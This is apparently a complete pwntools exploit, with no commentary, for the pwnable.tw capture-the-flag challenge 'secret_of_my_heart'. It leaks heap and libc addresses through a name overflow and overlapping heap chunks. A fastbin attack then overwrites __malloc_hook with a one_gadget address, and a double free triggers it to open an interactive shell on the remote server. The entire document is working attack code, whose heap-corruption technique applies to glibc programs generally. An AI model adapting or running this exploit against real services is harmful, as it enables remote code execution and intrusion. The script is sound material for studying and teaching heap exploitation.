from pwn import *

BEDUG = False

libc = ELF('./libc_64.so.6')

if BEDUG==True:
    io = process('./secret_of_my_heart_patched', env={"LD_PRELOAD":"./libc_64.so.6"})
    gdb.attach(io)
else:
    io = remote('chall.pwnable.tw', 10302)

def add(size, name, data):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Size of heart : ', str(size).encode('utf-8'))
    io.sendafter(b'Name of heart :', name)
    io.sendafter(b'secret of my heart :', data)

def show(idx):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(idx).encode('utf-8'))

def rm(idx):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(idx).encode('utf-8'))

add(0x68, b'A'*32, b'B')
show(0)
io.recvline()
io.recvline()
io.recvuntil(b'Name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
heap_base = u64(io.recv(6)+b'\0\0') - 0x10
log.info('Heap: '+hex(heap_base))
add(248, b'A', b'B')
add(0x68, b'A', b'B')
rm(0)
add(0x68, b'A', p64(heap_base)*2+b'\0'*0x50+p64(0x70))
rm(1)
show(0)
io.recvline()
io.recvline()
io.recvline()
io.recvuntil(b'Secret : ')
libc.address = u64(io.recv(6)+b'\0\0') - 0x3c3b78
log.info('Libc: '+hex(libc.address))
add(0x68, b'A', b'B')
rm(1)
rm(2)
rm(0)
one_gadget = libc.address+0xef6c4

add(0x68, b'A', p64(libc.sym['__malloc_hook']-35))
add(0x68, b'A', b'B')
add(0x68, b'A', b'B')
add(0x68, b'A', b'\0'*19+p64(one_gadget))
rm(0)
rm(2)
io.interactive()
